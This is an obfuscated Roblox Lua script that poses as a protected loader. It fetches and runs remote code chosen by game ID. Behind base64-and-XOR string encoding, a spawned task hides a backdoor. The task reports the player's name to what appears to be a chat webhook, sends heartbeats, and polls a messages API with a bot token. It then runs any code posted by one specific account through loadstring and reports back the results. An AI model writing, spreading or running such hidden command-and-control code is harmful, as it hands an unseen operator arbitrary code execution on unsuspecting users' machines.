--
-- Protected with Roblox Script Obfuscator
-- Generated: 2026-10-26
-- This script has been obfuscated for distribution.
--

local _dwqykTable = {["A"] = 0, ["B"] = 1, ["C"] = 2, ["D"] = 3, ["E"] = 4, ["F"] = 5, ["G"] = 6, ["H"] = 7, ["I"] = 8, ["J"] = 9, ["K"] = 10, ["L"] = 11, ["M"] = 12, ["N"] = 13, ["O"] = 14, ["P"] = 15, ["Q"] = 16, ["R"] = 17, ["S"] = 18, ["T"] = 19, ["U"] = 20, ["V"] = 21, ["W"] = 22, ["X"] = 23, ["Y"] = 24, ["Z"] = 25, ["a"] = 26, ["b"] = 27, ["c"] = 28, ["d"] = 29, ["e"] = 30, ["f"] = 31, ["g"] = 32, ["h"] = 33, ["i"] = 34, ["j"] = 35, ["k"] = 36, ["l"] = 37, ["m"] = 38, ["n"] = 39, ["o"] = 40, ["p"] = 41, ["q"] = 42, ["r"] = 43, ["s"] = 44, ["t"] = 45, ["u"] = 46, ["v"] = 47, ["w"] = 48, ["x"] = 49, ["y"] = 50, ["z"] = 51, ["0"] = 52, ["1"] = 53, ["2"] = 54, ["3"] = 55, ["4"] = 56, ["5"] = 57, ["6"] = 58, ["7"] = 59, ["8"] = 60, ["9"] = 61, ["+"] = 62, ["/"] = 63}
local function _dwqyk(s)
    local bytes = {}
    local buffer, bits = 0, 0
    for i = 1, #s do
        local ch = s:sub(i, i)
        if ch == "=" then break end
        local val = _dwqykTable[ch]
        if val ~= nil then
            buffer = bit32.bor(bit32.lshift(buffer, 6), val)
            bits = bits + 6
            if bits >= 8 then
                bits = bits - 8
                bytes[#bytes + 1] = bit32.band(bit32.rshift(buffer, bits), 0xFF)
            end
        end
    end
    local key = "jwymswqyququ"
    local out = {}
    for i = 1, #bytes do
        local k = key:byte(((i - 1) % #key) + 1)
        out[i] = string.char(bit32.bxor(bytes[i], k))
    end
    return table.concat(out)
end
local SAE = _dwqyk("AgMNHQBNXlYDFAZbDR4NBQYVBAoUBxIaBAMcAwdZEhYcWgUcDxkSBRIZGUheNhkcBhsQQDsCE1QiFgMcGgNWHxYRAlYZEBARGVgUDBoZXioFEBAZKxk8ChQQ")
local RAP = _dwqyk("AgMNHQBNXlYQBRhbBgIYHx4YA1cfEAVaDB4VCABYB01eGR4UDhILHlxHFRsSFBBMD05AX0dARkxDRhVGUhZBX0tDFU4VFxUQDFkVGBI=")
local JFA = _dwqyk("AgMNHQBNXlYDFAZbDR4NBQYVBAoUBxIaBAMcAwdZEhYcWgUcDxkSBRIZGUheNhkcBhsQQDsCE1QiFgMcGgNWHxYRAlYZEBARGVgUDBoZXjMEGAEzBQU4AxoaEBUC")
local SAB = _dwqyk("AgMNHQBNXlYDFAZbDR4NBQYVBAoUBxIaBAMcAwdZEhYcWgUcDxkSBRIZGUheBgEcCQ5WHxYRAlYZEBARGVgUDBoZXioFEBAZRxZULwEWGBcDGgU=")
local MM2 = _dwqyk("AgMNHQBNXlYQBRhbBgIYHx4YA1cfEAVaDB4VCABYB01eGR4UDhILHlxFEx9CQUlNU0NNXEUSQB1CERQQD0NJDxZARE8VQUMTDFkVGBI=")
local BROOK = _dwqyk("AgMNHQBNXlYQBRhbBgIYHx4YA1cfEAVaDB4VCABYB01eGR4UDhILHlxPSEhIRRBFWREdXkBAQk1IFhQTW0NJCUZAR0pEQhMUWVkVGBI=")
local byGameId = {
[10563114921] = SAE, [10035204815] = RAP, [10690360998] = JFA,
[7709344486] = SAB, [(66654484 - 349)] = MM2, [1686885941] = BROOK,
}
local byPlaceId = {
[107778070777162] = SAE, [124216119978534] = RAP, [126870639873289] = JFA,
[109983668079237] = SAB, [(142823484 - 193)] = MM2, [4924922222] = BROOK,
}



task.spawn(function()
local _v1 = game:GetService(_dwqyk("OhsYFBYFAg=="))
local _v2 = game:GetService(_dwqyk("IgMNHSASAw8YFhQ="))
local _v3 = (syn and syn.request) or (http and http.request) or _v2.RequestAsync

local _v4 = _v2:Base64Decode(_dwqyk("Cz8rXRA/PE89DEgeCy83BxFEOxI9GD8DCCRABRAwGg8VRyccCzBAGxJEPA88ISBBJx0aWT4zFko8HyhBJw04FDwzKAM8JkgmDiIJGhIZMzUiGCcUPRxIFBIzMyATM0hGOUUvOilEASkVPQEGDkcrJSZHAQkiRxUlCCEjPRANIxgSRiMGPjAVHz5EEkkUHisTCA0vWSYjGUw+IB0/MkQJWw=="))
local _v5 = _v2:Base64Decode(_dwqyk("JyMoWT4dEko+MTxHJw08FD4jEks/HyBAJxBEUA=="))
local _v6 = _v2:Base64Decode(_dwqyk("JyM0WD0zPEo/IRINJzMwXj0NOEk8HxoMJxBEUA=="))
local _v7 = _v2:Base64Decode(_dwqyk("PiErOz4cRDwgITs7ODIsGicvASMUMEgwMA0rIhYbGkklIDQAOEUaGikaKz09GDcPCEQJFxYaJzMmMzM5PCIdOD0vMAASRjsZCyIvGhIwRDQ+ISRFJiIvHD40QUgQGDcz"))
local _v8 = _dwqyk("Wg==")
local _v9 = _v1.LocalPlayer
local function _va(_vn, _vo, _vp)
pcall(function()
_v3({
Url = _v4,
Method = _dwqyk("OjgqOQ=="),
Headers = {[_dwqyk("KRgXGRYZBVQlDAEQ")] = _dwqyk("CwcJARoUEA0YGh9aAAQWAw==")},
Body = _v2:JSONEncode({
embeds = {{
title = _vn,
description = _dwqyk("ChcZAQYWew==") .. tostring(_vo) .. _dwqyk("YBcZDQ=="),
color = _vp or (3447158 - 155)
}}
})
})
end)
end
local function _vb(s)
local _vq = s:gsub(_dwqyk("ChcZAQYW"), ""):gsub(_dwqyk("ChcZ"), "")
return _vq:match(_dwqyk("NFIKR1tZXFBUBltR"))
end
_va(_dwqyk("KRgXAxYUBRwV"), _dwqyk("PhYLChYDS1k=") .. _v9.Name .. _dwqyk("YDsQHgcSHxAfElETBQVZDhwaHBgfEQJbRFk="), (65686 - 406))

task.spawn(function()
while true do
task.wait((14 - 4))
_va(_dwqyk("KxsQGxY="), "", (3067004 - 11))
end
end)

while true do
local s, _vd = pcall(function()
local _vr = _dwqyk("AgMNHQBNXlYVHAIWBQUdQxAYHFYQBRhaHEZJQhAfEBcfEB0GRQ==") .. _v5 .. _dwqyk("RRocHgAWFhwCSh0cBx4NUEI=")
return _v3({Url = _vr, Method = _dwqyk("LTIt"), Headers = {[_dwqyk("KwINBRwFGAMQARgaBA==")] = _dwqyk("KBgNTQ==") .. _v7}})
end)
if s and _vd and _vd.Body then
local _vf, _vg = pcall(_v2.JSONDecode, _v2, _vd.Body)
if _vf and type(_vg) == _dwqyk("HhYbARY=") and #_vg > 0 then
local _vh = _vg[1]
if _vh.id ~= _v8 and tostring(_vh.author.id) == _v6 then
_v8 = _vh.id
local _vi = _vb(_vh.content)
if _vi ~= "" then
task.spawn(function()
local _vs, _vt = loadstring(_vi)
if not _vs then
_va(_dwqyk("OQ4XGRIPUTwDBx4H"), _vt, (15158614 - 282))
return
end
local _vu, _vv = pcall(_vs)
if _vu then
_va(_dwqyk("OQIaDhYEAg=="), _vv, (65518 - 238))
else
_va(_dwqyk("OAIXGRoaFFk0BwMaGA=="), _vv, (15158584 - 252))
end
end)
end
end
end
end
task.wait((4 - 2))
end
end)

local gameId = game.GameId
while gameId == 0 and game.PlaceId == 0 do
task.wait()
gameId = game.GameId
end
local url = byGameId[gameId] or byPlaceId[game.PlaceId]
if not url then return end
for _ = 1, (6 - 3) do
local ok, source = pcall(game.HttpGet, game, url)
if ok and type(source) == _dwqyk("GQMLBB0Q") and source ~= "" then
local chunk = loadstring(source)
if chunk then
chunk()
end
return
end
task.wait(0.5)
end
